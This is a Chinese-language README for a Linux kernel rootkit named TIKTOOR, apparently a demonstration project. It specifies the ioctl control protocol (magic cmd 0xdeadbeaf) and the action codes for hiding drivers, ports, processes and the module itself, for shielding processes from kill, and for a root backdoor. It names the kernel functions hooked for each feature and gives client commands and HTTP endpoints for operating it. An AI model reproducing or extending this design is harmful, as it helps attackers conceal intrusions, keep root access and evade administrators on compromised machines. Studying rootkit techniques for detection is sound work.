# TIKTOOR

> TIKTOOR DID I DWELL， LEWD I DID ROOTKIT

## 通信协议

client与lkm通过`ioctl`通信。client生成一个socket fd后，对该fd发出`ioctl`，lkm对`inet_ioctl`进行hook，进行通信。这种方案参考了[f0rb1dd3n/Reptile](https://github.com/f0rb1dd3n/Reptile)，实际上也可以通过`kill`等系统调用进行通信，但这种方案可以传递自定义参数，更加灵活。

`ioctl`原型：

```c
#include <sys/ioctl.h>
int ioctl(int fd, unsigned long request, ...);
```

其具体参数，根据`fd`的实际类型有关。如果`fd`是socket fd，则内核态的`inet_ioctl`响应函数原型为

```c
int inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg);
```

我们通过定义与现有常数不冲突的`cmd`作为rootkit标识，hook该函数，对有该标识的请求进行特殊处理。

rootkit的`cmd`标识符为`0xdeadbeaf`，此时`arg`为指针，指向结构体

```c
struct TiktoorCmdArg {
    unsigned char action;
    void *subargs;
};
```

`subargs`指向的实际类型根据`action`的值而定。

### 驱动隐藏

`action`为`0x0`

目前的实现是通过module的list来沿链表找到其他module并且把该module断链，缺点是需要先unhide才能找到其他module

（目前没有找到比较好的寻找头节点的方法，主要是while循环总停不下来，暂时断tiktoor后第rank个module的链，之后继续实现断lsmod中第几个）

如：tiktoor hello1 hello2 

设置rank=1后隐藏hello1

### 文件隐藏

`action`为`0x1`

### 端口隐藏

`action`为`0x2`。

此时`subargs`指向的类型为

```c
struct PortHidingSubargs {
    unsigned char transmission_type;
    unsigned short port;
};
```

其中，`transmission_type`可能的值为

* `0x0`: TCP4
* `0x1`: TCP6
* `0x2`: UDP4
* `0x3`: UDP6

### 进程隐藏

`action`为`0x3`。

此时`subargs`指向的类型为

```c
struct ProcessHidingSubargs {
    unsigned int pid;
};
```

### 进程保护

`action`为`0x4`。

此时`subargs`指向的类型为

```c
struct ProcessProtectingSubargs {
    unsigned int pid;
};
```

### 内核模块隐藏

`action`为`0x5`。

完整的rootkit需要将自身隐藏。我们实现了这个功能，但为了演示的需要，并不是在模块载入的时候自动隐藏，而是收到命令后将自身隐藏。

### 内核模块恢复

`action`为`0x6`。

### root后门

`action`为`0x7`。

## 原理

### 端口隐藏

参考<https://xcellerator.github.io/posts/linux_rootkits_08/>。

在模块中维护四个数组`tcp4_list`, `tcp6_list`, `udp4_list`, `udp6_list`，分别存储四种协议需要隐藏的端口。

然后分别对`tcp4_seq_show`, `tcp6_seq_show`, `udp4_seq_show`, `udp6_seq_show`进行hook，当其流量的端口号在对应的数组中时，对相应的端口进行隐藏。

### 进程隐藏

参考[f0rb1dd3n/Reptile](https://github.com/f0rb1dd3n/Reptile)。

将`pid`对应的`struct task_struct`的`flag`字段增加位`0x02000000`（从linux源码来看，目前这个标志位没有被占用）。

首先，我们对`find_task_by_vpid`进行hook。该API是所有通过pid获取进程的入口。通过hook，可以阻止他人通过pid获取被隐藏的进程。

然后，我们对`vfs_statx`进行hook。该API是内部API，用于对文件系统的访问。通过hook，可以阻止他人通过`/proc`虚拟文件系统操作进程。

此外，我们对`copy_creds`和`exit_creds`进行hook，确保被隐藏的进程`fork()`出的子进程依然被隐藏。

### 进程保护

参考[f0rb1dd3n/Reptile](https://github.com/f0rb1dd3n/Reptile)。

将`pid`对应的`struct task_struct`的`flag`字段增加位`0x00000008`（从linux源码来看，目前这个标志位没有被占用）。

对`sys_kill`和`__x64_sys_kill`进行hook，这两个API是使用`kill`命令后要调用的函数。通过hook，可以判断`kill`命令处理的进程是否为保护的进程，若是，不传递任何信号给保护进程，并返回“该进程不存在”的错误信息；若不是，则正常调用`kill`命令。

### 模块隐藏

参考<https://xcellerator.github.io/posts/linux_rootkits_05/>，只需要将当前的模块在模块列表中删除即可（由于没有被释放，所以当前模块仍然在内核内存中工作）

## 客户端

用户态的客户端程序根据设定的通信协议与Rootkit进行通信。

### 构建

进入`client`目录，使用

```sh
cargo build --workspace --release
```

编译客户端程序（需要[安装Rust](https://www.rust-lang.org/zh-CN/tools/install)）。

构建完成后，所有程序位于`client/target/release`目录中。

### 使用

目前有两个客户端程序`tiktoor-cli`和`tiktoor-daemon`。前者是简单的命令行工具，后者是守护进程。一般使用前者作简单的测试使用，使用后者作为真实的客户端。

#### `tiktoor-cli`

使用

```sh
./tiktoor-cli --help
```

可以查看其使用方法。

##### 驱动隐藏
```sh
./tiktoor-cli driver-hiding --rank 1
```

可隐藏lsmod表中rootkit后第1个驱动
##### 文件隐藏

##### 端口隐藏

```sh
./tiktoor-cli port-hiding --port 1234 tcp4
```

可隐藏tcp4的端口号为1234的端口。

##### 进程隐藏

```sh
./tiktoor-cli process-hiding --pid 123456
```

可隐藏进程号为123456的进程。

##### 进程保护
```sh
./tiktoor-cli process-protection --pid 123456
```
可以保护进程号为123456的进程，使其接收不到kill发送的信号。

##### 内核模块隐藏

```sh
./tiktoor-cli module-hiding
```

##### 内核模块恢复

```sh
./tiktoor-cli module-unhiding
```

#### `tiktoor-daemon`

该程序为常驻后台的守护进程，可通过

```sh
./tiktoor-daemon --host localhost --port 2333
```

启动，监听`localhost:2333`。

##### 驱动隐藏

##### 文件隐藏

##### 端口隐藏

监听端口为`/hide_port`，方法为POST。内容需满足格式

```json
{ "transmission_type": 0, "port": 1234 }
```

##### 进程隐藏

监听接口为`/hide-process`，方法为POST。内容需要满足格式

```json
{ "pid": 123456 }
```

##### 进程保护

监听接口为`/protect_process`，方法为POST。内容需要满足格式

```json
{ "pid": 123456 }
```

##### 内核模块隐藏

监听接口为`/hide-module`，方法为POST。

##### 内核模块恢复

监听接口为`/unhide-module`，方法为POST。
